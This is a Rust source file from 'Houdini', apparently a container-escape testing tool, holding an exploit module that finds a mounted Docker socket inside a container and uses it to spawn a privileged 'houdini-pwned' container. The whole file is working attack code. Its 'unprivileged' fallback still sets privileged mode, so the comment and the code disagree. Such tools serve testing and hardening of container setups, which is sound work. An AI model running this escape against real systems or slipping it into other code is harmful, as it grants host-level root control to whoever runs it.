// SPDX-License-Identifier: Apache-2.0
//
// Houdini  A container escape artist
// Copyright (c) 2022  William Findlay
//
// February 25, 2022  William Findlay  Created this.
//

use anyhow::{bail, Result};
use futures::StreamExt;
use std::{os::unix::prelude::FileTypeExt, path::PathBuf};

use docker_api::{
    api::{ContainerCreateOpts, ContainerOptsBuilder, PullOpts},
    Docker,
};
use jwalk::{DirEntry, WalkDir};

use crate::CONFIG;

use super::{Exploit, ExploitStatus};

const IMAGE: &'static str = "bash";

/// An exploit that targets a mounted docker docket inside a container.
#[derive(Debug, Default)]
pub struct MountedDockerSocket;

#[async_trait]
impl Exploit for MountedDockerSocket {
    async fn run(&mut self) -> Result<ExploitStatus> {
        if let Some(socket) = find_docker_socket().await {
            let client = Docker::unix(&socket);

            // Check whether the payload image needs to be pulled
            if let Err(_) = client.images().get(IMAGE).inspect().await {
                // Pull the image if needed
                tracing::info!(
                    image = IMAGE,
                    "Failed to find payload image locally, pulling..."
                );
                let mut stream = client
                    .images()
                    .pull(&PullOpts::builder().image(IMAGE).build());
                while let Some(res) = stream.next().await {
                    match res {
                        Err(e) => bail!("Failed to pull image: {e}"),
                        _ => {}
                    }
                }
            } else {
                tracing::debug!(image = IMAGE, "Found payload image locally");
            }

            // Attempt to spawn a privileged container
            let opts = ContainerCreateOpts::builder(IMAGE)
                .name("houdini-pwned")
                .privileged(true)
                .build();
            if let Ok(container) = client.containers().create(&opts).await {
                container.start().await?;
                container.delete().await?;
                return Ok(ExploitStatus::ContainerEscapeWithRoot);
            }

            // Attempt to spawn an unprivileged container
            let opts = ContainerCreateOpts::builder(IMAGE)
                .name("houdini-pwned")
                .privileged(true)
                .build();
            let container = client.containers().create(&opts).await?;
            container.start().await?;
            container.delete().await?;
            return Ok(ExploitStatus::ContainerEscape);
        } else {
            bail!("Failed to find a mounted Docker socket");
        }
    }

    fn volumes(&self) -> Vec<String> {
        vec![format!(
            "{}:/docker.sock",
            CONFIG.docker.socket.to_string_lossy()
        )]
    }
}

/// Attempts to find a mounted Docker socket in the container's filesystem.
async fn find_docker_socket() -> Option<PathBuf> {
    for entry in WalkDir::new("/").into_iter().filter_map(Result::ok) {
        if test_docker_sock(&entry).await {
            tracing::info!(path = debug(&entry.path()), "Found mounted docker socket!");
            return Some(entry.path());
        }
    }
    tracing::info!("Failed to find mounted docker.sock");
    return None;
}

/// Tests a file to see if it is a Docker socket.
async fn test_docker_sock(entry: &DirEntry<((), ())>) -> bool {
    tracing::debug!(
        file = debug(&entry.path()),
        "Testing file for docker socket..."
    );
    if entry
        .metadata()
        .map(|m| m.file_type().is_socket())
        .unwrap_or(false)
    {
        tracing::debug!(file = debug(&entry.path()), "Found candidate socket!");
        let client = Docker::unix(&entry.path());
        if let Ok(_) = client.ping().await {
            return true;
        }
    }

    false
}
